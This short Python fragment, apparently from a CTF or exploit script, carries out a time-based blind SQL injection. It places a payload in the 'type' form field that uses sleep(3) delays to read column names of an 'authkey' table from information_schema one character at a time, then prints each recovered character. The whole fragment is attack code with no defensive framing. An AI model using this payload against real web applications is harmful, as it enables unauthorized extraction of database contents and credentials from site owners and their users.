...
for i in range(1,30):
    for j in range(32,128):
        data = {"cont":"asd","mail":"guest",'type': "1 and if ((select ascii(substr(group_concat(column_name), "+str(i)+", 1)) from information_schema.columns where table_name = 0x617574686b6579) = "+str(j)+", sleep(3), 1)"}
        ...
        print "1 and if ((select ascii(substr(group_concat(column_name), "+str(i)+", 1)) from information_schema.columns where table_name = 0x617574686b6579) = "+str(j)+", sleep(3), 1)"
        time2=time.time()
        if (time2-time1>2):
            print "[+]find : " + chr(j)
            column+=chr(j)
